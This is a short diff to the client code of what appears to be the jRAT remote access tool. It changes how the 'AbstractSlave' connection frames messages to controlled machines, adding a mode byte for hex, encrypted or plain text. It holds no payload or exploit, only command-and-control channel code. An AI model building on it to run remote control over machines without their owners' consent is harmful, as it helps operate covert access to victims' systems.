@@ -14,9 +14,9 @@ import se.jrat.client.io.CountingOutputStream;
 import se.jrat.client.ip2c.Country;
 import se.jrat.client.net.PortListener;
 import se.jrat.client.packets.outgoing.Packet99Encryption;
+import se.jrat.client.settings.CountryStatistics;
 import se.jrat.client.settings.ServerID;
 import se.jrat.client.settings.Settings;
-import se.jrat.client.settings.CountryStatistics;
 import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.ui.panels.PanelMainLog;
 import se.jrat.client.utils.FlagUtils;
@@ -192,15 +192,17 @@ public abstract class AbstractSlave implements Runnable {
 	public void writeLine(String s) {
 		try {
 			String enc = Crypto.encrypt(s, getKey());
-
+			byte mode = 0;
+			
 			if (enc.contains("\n")) {
-				enc = "-h " + Hex.encode(s);
-			} else if (s.startsWith("-c ")) {
+				mode = 1;
+				enc = Hex.encode(s);
+			} if (!encryption) {
+				mode = 2;
 				enc = s;
-			} else if (!encryption) {
-				enc = "-c " + s;
 			}
 
+			dos.writeByte(mode);
 			dos.writeShort(enc.length());
 			dos.writeChars(enc);
 		} catch (Exception ex) {
@@ -209,6 +211,7 @@ public abstract class AbstractSlave implements Runnable {
 	}
 
 	public String readLine() throws Exception {
+		byte mode = dis.readByte();
 		short len = dis.readShort();
 
 		StringBuilder builder = new StringBuilder();
@@ -218,11 +221,9 @@ public abstract class AbstractSlave implements Runnable {
 
 		String s = builder.toString();
 
-		if (s.startsWith("-h ")) {
-			s = Hex.decode(s.substring(3, s.length()));
-		} else if (s.startsWith("-c ")) {
-			s = s.substring(3, s.length());
-		} else {
+		if (mode == 1) {
+			s = Hex.decode(s);
+		} else if (mode == 0) {
 			try {
 				s = Crypto.decrypt(s, getKey());
 			} catch (Exception e) {
